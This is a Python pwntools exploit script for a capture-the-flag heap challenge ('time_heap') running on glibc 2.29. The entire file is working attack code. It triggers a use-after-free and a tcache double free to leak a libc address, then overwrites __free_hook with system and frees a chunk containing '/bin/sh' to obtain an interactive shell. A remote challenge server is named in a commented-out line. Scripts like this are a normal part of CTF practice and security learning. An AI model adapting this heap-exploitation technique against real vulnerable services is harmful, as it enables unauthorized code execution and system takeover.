#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF('./time_heap_patched')
# context.log_level = 'debug'

host, port =  'nc.eonew.cn', 10015


io = elf.process()
# io = remote(host, port )
libc = ELF('./libc-2.29.so', checksec = False)
def menu():
    io.recvuntil(b'choice: ')

def add(size, content, remark):
    menu()
    io.sendline(b'1')
    io.recvuntil(b': ')
    io.sendline(str(size).encode())
    io.recvuntil(b': ')
    io.sendline(content)
    io.recvuntil(b': ')
    io.sendline(remark)

def delete(idx):
    menu()
    io.sendline(b'2')
    io.sendlineafter(b': ', str(idx).encode())

def edit(idx, content, remark):
    menu()
    io.sendline(b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', content)
    io.sendlineafter(b': ', remark)

def show(idx):
    menu()
    io.sendline(b'4')
    io.sendlineafter(b': ', str(idx).encode())

add(0x88, b'aaaa', b'bbbb')
delete(0)

for i in range(7):
    edit(0, b'\x00' * 0x10, b'\x00')
    delete(0)

# gdb.attach(io)

show(0)
io.recvuntil(b'Content: ')

leak_libc = u64(io.recv(6).ljust(8,b'\x00'))
log.success("Leak address: " + hex(leak_libc))

libc_base = leak_libc - libc.symbols['__malloc_hook']- 96 - 0x10
log.success('Libc base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
log.info("system address: " + hex(system_addr))

free_hook = libc_base + libc.symbols['__free_hook']
log.info("__free_hook address: " + hex(free_hook))

bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.info("/bin/sh address: " + hex(bin_sh))

edit(0, p64(free_hook), b'\x00')
add(0x88, p64(system_addr), p64(system_addr))

edit(0, b'/bin/sh\x00', b'\x00')
delete(0)
# gdb.attach(io)

io.interactive()

